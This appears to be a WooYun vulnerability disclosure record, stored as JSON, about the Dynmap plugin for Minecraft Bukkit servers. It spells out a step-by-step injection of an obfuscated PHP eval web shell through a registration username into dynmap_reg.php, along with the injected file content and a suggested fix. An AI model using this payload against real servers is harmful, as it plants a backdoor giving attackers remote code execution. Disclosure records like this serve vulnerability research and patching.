{"id": 39638, "wybug_id": "wooyun-2015-093609", "wybug_title": "Minecraft Bukkit服务器某插件可导致远程代码执行", "wybug_corp": "Bukkit", "wybug_author": "路人甲", "wybug_date": "2015-01-26 10:28", "wybug_open_date": "2015-04-26 10:30", "wybug_type": "远程代码执行", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Minecraft Bukkit服务器某插件可导致远程代码执行开服时发现的，呵呵 详细说明：  插件下载地址：\nhttp://dev.bukkit.org/bukkit-plugins/dynmap\n在特定配置下可以导致远程代码执行（可能需要op权限执行dynmap webregister命令）首先看一下插件使用数量http://www.baidu.com/s?wd=Minecraft%20Dynamic%20Map光百度搜索结果就占了三页问题出在当dynmap安装在独立的网站服务器上时注意到dynmap_reg.php保存了用户信息，每一行的格式都是username=invite_code=password_hash，其中invite_code和password_hash没法注入，尝试注入usernamedynmap配置：开放注册首先进入服务器，输入\n/dynmap webregister */eval('eval($_'.chr(80).chr(79).chr(83).chr(84).'[c])')/*\n\n\n然后访问http://path/to/dynmap/files/login.html如图，用得到的注册码注册，密码随便，用户名\n*/eval('eval($_'.chr(80).chr(79).chr(83).chr(84).'[c])')/*\n\n\n注册后得到shell，地址http://path/to/dynmap/files/standalone/dynmap_reg.php，密码c   漏洞证明：  \n\n检查dynmap_reg.php<?php /**/eval('eval($_'.chr(80).chr(79).chr(83).chr(84).'[c])')/*=8615-7332=(保密)*/ ?>成功注入   修复方案：  过滤/符号   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-03-25 21:27 |    \t\t炮灰乙 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 我叫路人甲，我住在中国)\t\t \n  经过与插件作者mikeprimm@MinecraftForum.net交涉，漏洞已修复https://github.com/webbukkit/DynmapCore/commit/9d93813e958a0c79f63fd3df5529bf949356181a    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}